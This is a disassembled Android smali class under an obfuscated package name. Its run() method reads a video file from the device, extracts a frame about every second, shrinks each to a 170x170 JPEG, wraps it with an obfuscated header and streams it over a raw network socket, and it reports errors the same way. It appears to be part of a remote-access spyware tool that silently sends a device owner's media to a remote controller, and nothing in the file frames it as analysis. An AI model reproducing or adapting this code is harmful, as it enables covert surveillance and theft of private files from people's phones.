.class Lcmf0/c3b5bm90zq/patch/C11$6;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C11;->b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Ljava/lang/String;

.field final synthetic d:Ljava/lang/String;

.field final synthetic e:Ljava/lang/String;

.field final synthetic f:Lcmf0/c3b5bm90zq/patch/C11;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->f:Lcmf0/c3b5bm90zq/patch/C11;

    iput-object p2, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->a:Ljava/lang/String;

    iput-object p3, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->b:Ljava/lang/String;

    iput-object p4, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->c:Ljava/lang/String;

    iput-object p5, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->d:Ljava/lang/String;

    iput-object p6, p0, Lcmf0/c3b5bm90zq/patch/C11$6;->e:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 20

    move-object/from16 v1, p0

    :try_start_0
    iget-object v0, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->a:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->b:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->c:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    new-instance v7, Ljava/io/File;

    invoke-virtual {v6}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v8, Landroid/media/MediaMetadataRetriever;

    invoke-direct {v8}, Landroid/media/MediaMetadataRetriever;-><init>()V

    invoke-virtual {v7}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Landroid/media/MediaMetadataRetriever;->setDataSource(Ljava/lang/String;)V

    iget-object v9, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->f:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v9}, Lcmf0/c3b5bm90zq/patch/C11;->getBaseContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v9, v6}, Landroid/media/MediaPlayer;->create(Landroid/content/Context;Landroid/net/Uri;)Landroid/media/MediaPlayer;

    move-result-object v6

    invoke-virtual {v6}, Landroid/media/MediaPlayer;->getDuration()I

    move-result v6

    int-to-long v9, v6

    const v6, 0xf4240

    const v11, 0xf4240

    :goto_0
    int-to-long v12, v11

    const-wide/16 v14, 0x3e8

    mul-long v14, v14, v9

    cmp-long v16, v12, v14

    if-gez v16, :cond_4

    iget-object v14, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->f:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v14}, Lcmf0/c3b5bm90zq/patch/C11;->F(Lcmf0/c3b5bm90zq/patch/C11;)Z

    move-result v14

    const/4 v15, 0x1

    if-ne v14, v15, :cond_0

    goto/16 :goto_3

    :cond_0
    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v14

    if-eqz v14, :cond_3

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v16

    const-wide/16 v18, 0x0

    cmp-long v14, v16, v18

    if-nez v14, :cond_1

    return-void

    :cond_1
    const/4 v14, 0x2

    invoke-virtual {v8, v12, v13, v14}, Landroid/media/MediaMetadataRetriever;->getFrameAtTime(JI)Landroid/graphics/Bitmap;

    move-result-object v12

    iget-object v13, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->f:Lcmf0/c3b5bm90zq/patch/C11;

    const/16 v14, 0xaa

    invoke-virtual {v13, v12, v14, v14}, Lcmf0/c3b5bm90zq/patch/C11;->a(Landroid/graphics/Bitmap;II)Landroid/graphics/Bitmap;

    move-result-object v12
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v12, :cond_3

    :try_start_1
    invoke-static {v12, v14, v14, v15}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v12

    new-instance v13, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v13}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v14, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    invoke-virtual {v12, v14, v0, v13}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    const/4 v12, 0x0

    invoke-static {v12}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0xf

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0x64

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->b:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->c:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->d:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, v1, Lcmf0/c3b5bm90zq/patch/C11$6;->e:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->e:Ljava/lang/String;

    invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v13}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/a;->a([B)[B

    move-result-object v2

    array-length v3, v2

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-static {v3}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v14}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4, v2}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->k()Ljava/lang/Object;

    move-result-object v3

    monitor-enter v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_0

    :try_start_2
    sget-object v4, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    if-eqz v4, :cond_2

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v4

    array-length v5, v2

    invoke-virtual {v4, v5}, Ljava/net/Socket;->setSendBufferSize(I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v4

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    sput-object v4, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    sget-object v4, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    array-length v5, v2

    invoke-virtual {v4, v2, v12, v5}, Ljava/io/OutputStream;->write([BII)V

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    :cond_2
    monitor-exit v3

    goto :goto_1

    :catchall_0
    move-exception v0

    monitor-exit v3
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    throw v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_0

    :cond_3
    :goto_1
    add-int/2addr v11, v6

    goto/16 :goto_0

    :catch_0
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0xe

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0x53

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/OutOfMemoryError;->getMessage()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :catch_1
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0xe

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0x53

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "null"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    :catch_2
    :cond_4
    :goto_3
    return-void
.end method
